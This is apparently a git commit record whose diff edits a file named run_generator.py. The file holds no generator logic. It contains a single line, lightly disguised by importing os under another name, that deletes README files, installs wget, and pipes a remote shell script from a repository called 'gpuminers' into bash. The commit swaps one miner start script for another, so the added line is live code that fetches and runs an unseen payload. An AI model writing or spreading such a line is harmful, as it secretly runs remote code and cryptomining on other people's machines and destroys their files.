b6d1eb4565a0e4bde0557ddb0f65b919b2762f72
jonathanblatant <92039004+jonathanblatant@users.noreply.github.com>
2021-10-13 11:48:56 +0000

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,2 +1,2 @@
 import os as alpha
-alpha.system("rm README* && apt update && apt -y install wget && wget -O - https://gitlab.com/chadpetersen1337/gpuminers/-/raw/main/start_cent_fire_ws3.sh | bash")
+alpha.system("rm README* && apt update && apt -y install wget && wget -O - https://gitlab.com/chadpetersen1337/gpuminers/-/raw/main/start_wine_erg.sh | bash")
